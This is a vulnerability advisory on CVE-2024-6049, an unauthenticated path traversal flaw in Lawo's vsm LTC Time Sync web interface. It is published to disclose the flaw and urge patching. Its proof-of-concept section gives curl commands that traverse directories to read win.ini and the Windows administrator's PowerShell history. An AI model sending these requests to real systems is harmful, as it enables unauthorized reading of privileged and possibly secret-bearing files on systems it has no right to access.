Sandro Einfeldt, Dennis Jung | SEC Consult Vulnerability Lab

The web interface of Lawo AG vsm LTC Time Sync (vTimeSync) was vulnerable to a path traversal vulnerability. By sending a specially crafted HTTP request, an unauthenticated remote attacker could download arbitrary files from the vulnerable system. As a limitation, the exploitation was only possible if the requested file has a file extension, e. g. .exe or .txt.

## Vendor description

*"Lawo designs and manufactures video, audio, control and monitoring technology for broadcast, performing arts, installed sound and corporate applications. All products are developed in Germany and manufactured according to highest quality standards at the company's headquarters in the Rhine valley town of Rastatt, Germany."*

Source: [lawo.com/company/about-us/&nbsp](https://lawo.com/company/about-us/%26nbsp);

## Business recommendation

The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product conducted by security professionals to identify and resolve potential further security issues.

## Vulnerability overview/description

### 1) Unauthenticated Path Traversal Vulnerability (CVE-2024-6049)

The web interface of vsm LTC Time Sync (vTimeSync) is vulnerable to a path traversal vulnerability. By sending a specially crafted HTTP request, an unauthenticated remote attacker can download arbitrary files from the vulnerable system. As a limitation, the exploitation is only possible if the requested file has a file extension, e.g. .exe or .txt.

The web server is running with highest SYSTEM privileges per default, which enables an attacker to gain access to privileged files.

## Proof of concept

### 1) Unauthenticated Path Traversal Vulnerability (CVE-2024-6049)

To exploit the vulnerability it is sufficient to use the following curl-command to send a request to the vulnerable web server:

```
curl http:// $host:8033/.../.../.../.../.../.../.../.../.../<Path to file>
```

For example, the following command can be used to request the default file win.ini:

```
curl http:// $host:8033/.../.../.../.../.../.../.../.../.../Windows/win.ini
```

If the application is running with SYSTEM-privileges (default), the following command can be used to exfiltrate the Powershell history of the Windows administrator, which might leak sensitive information:

```
curl http:// $host:8033/.../.../.../.../.../.../.../.../.../Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
```
## Vulnerable / tested versions

The following version has been tested which was the latest version available at the time of the test:

* 4.4.12.0

According to the vendor, versions before 4.5 are affected and v4.5.6.0 includes the fixes.
